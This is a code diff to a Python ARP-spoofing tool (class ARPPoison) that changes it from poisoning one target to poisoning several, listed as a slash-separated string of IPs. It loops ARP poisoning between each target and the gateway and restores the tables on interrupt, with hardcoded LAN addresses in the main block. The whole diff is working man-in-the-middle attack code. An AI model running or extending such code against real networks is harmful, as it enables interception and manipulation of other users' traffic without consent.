@@ -17,13 +17,16 @@ class Error(Exception):
     pass
 
 class ARPPoison():
-    def __init__(self,target,gateway,verbose=1):
+    def __init__(self,targets,gateway,verbose=1):
         self.gateway = gateway
-        self.target  = target
+        self.targets = []
+        # self.targets = list(targets.split("/"))
+        for x in list(targets.split("/")):
+            self.targets.append((x,self.get_mac_address(x)))
 
-        self.t_mac   = self.get_mac_address(target)
-        self.g_mac   = self.get_mac_address(gateway)
-        if not self.t_mac or not self.g_mac: logging.critical("Error getting mac addresses");raise Error("Error getting mac addresses")
+        # self.targets_mac = list([self.get_mac_address(i) for i in self.targets])
+        self.g_mac       = self.get_mac_address(gateway)
+        if not self.targets or not self.g_mac: logging.critical("Error getting mac addresses");raise Error("Error getting mac addresses")
 
         init()
         logging.addLevelName(logging.CRITICAL, f"[{red}!!{reset}]")
@@ -71,22 +74,25 @@ class ARPPoison():
             logging.critical("An error ocurred trying to kill main thread")
             raise Error("An error ocurred trying to kill main thread")
 
-        self.restore_arp(self.gateway,self.g_mac, self.target,self.t_mac)
-        self.restore_arp(self.target,self.t_mac, self.gateway,self.g_mac)
+        for target, t_mac in self.targets:
+            self.restore_arp(self.gateway,self.g_mac, target,t_mac)
+            self.restore_arp(target,t_mac, self.gateway,self.g_mac)
 
     def main(self):
-        logging.info(f"Target MAC: {self.t_mac}")
         logging.info(f"Gateway MAC: {self.g_mac}")
+        for target, t_mac in self.targets:
+            logging.info(f"{target} Target MAC: {t_mac}")
 
         try:
             while True:
-                self.poison_arp(self.target,self.t_mac,self.gateway)
-                self.poison_arp(self.gateway,self.g_mac,self.target)
+                for target,t_mac in self.targets:
+                    self.poison_arp(target,t_mac,self.gateway)
+                    self.poison_arp(self.gateway,self.g_mac,target)
         except KeyboardInterrupt:
             logging.debug("ARP spoof stoped")
 
 if __name__ == "__main__":
-    arppoison = ARPPoison("192.168.1.106","192.168.1.1")
+    arppoison = ARPPoison("192.168.1.106/192.168.1.100","192.168.1.1")
     try:
         arppoison.start()
         arppoison.main_thread.join()
